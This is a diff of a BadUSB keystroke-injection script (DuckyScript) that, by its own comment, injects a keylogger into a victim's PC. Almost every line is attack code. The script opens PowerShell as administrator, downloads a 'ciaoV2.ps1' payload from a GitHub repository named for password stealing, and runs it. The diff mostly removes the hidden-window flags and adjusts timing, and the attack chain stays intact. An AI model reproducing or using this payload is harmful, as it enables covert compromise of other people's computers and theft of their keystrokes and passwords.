@@ -1,5 +1,4 @@
 REM This script allows you to inject a software keylogger in victim's PC
-LOCALE FR
 DELAY 2500
 REM Minimize all app
 GUI d
@@ -7,14 +6,14 @@ DELAY 500
 REM Start powershell as admin
 GUI r
 DELAY 500
-STRING powershell.exe -windowstyle hidden
+STRING powershell.exe
 DELAY 200
 CTRL SHIFT ENTER
-DELAY 2000
+DELAY 1500
 LEFT
 DELAY 150
 ENTER
-DELAY 2000
+DELAY 1500
 REM Go to public documents directory
 STRING cd C:\Users\Public\Documents
 ENTER
@@ -29,6 +28,6 @@ STRING wget https://raw.githubusercontent.com/lshaf/BadUSB_passStealer/main/ciao
 ENTER
 DELAY 3500
 REM Start ps1 script
-STRING powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1
+STRING powershell.exe -noexit -file ciaoV2.ps1
 ENTER
 REM End of payload
